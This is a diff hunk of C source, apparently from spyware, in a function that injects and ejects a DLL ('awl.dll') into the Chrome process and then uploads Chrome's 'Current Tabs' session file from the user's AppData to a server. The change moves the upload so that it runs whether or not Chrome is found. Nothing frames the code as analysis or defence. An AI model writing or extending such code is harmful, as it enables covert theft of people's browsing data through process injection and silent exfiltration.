@@ -262,17 +262,19 @@ void sendChromeCurrentTabs(void)
    {
 	   inject_library(chromId, L"awl.dll");
 	   eject_library(chromId,L"awl.dll");
-	   
-		WCHAR lpwsPath[MAX_PATH] = {0};
-
-		if(SUCCEEDED(SHGetFolderPath(NULL, 
-									 CSIDL_LOCAL_APPDATA, 
-									 NULL, 
-									 0, 
-									 lpwsPath))) 
-		{
-			lstrcat(lpwsPath, L"\\Google\\Chrome\\User Data\\Default\\Current Tabs D");
-			sendFileToServer(lpwsPath);
-		}
    }
+   
+	WCHAR lpwsPath[MAX_PATH] = {0};
+	if(SUCCEEDED(SHGetFolderPath(NULL, 
+								 CSIDL_LOCAL_APPDATA, 
+								 NULL, 
+								 0, 
+								 lpwsPath))) 
+	{
+		if(chromId != -1)
+			lstrcat(lpwsPath, L"\\Google\\Chrome\\User Data\\Default\\Current Tabs D");
+		else
+			lstrcat(lpwsPath, L"\\Google\\Chrome\\User Data\\Default\\Current Tabs");
+		sendFileToServer(lpwsPath);
+	}
 }
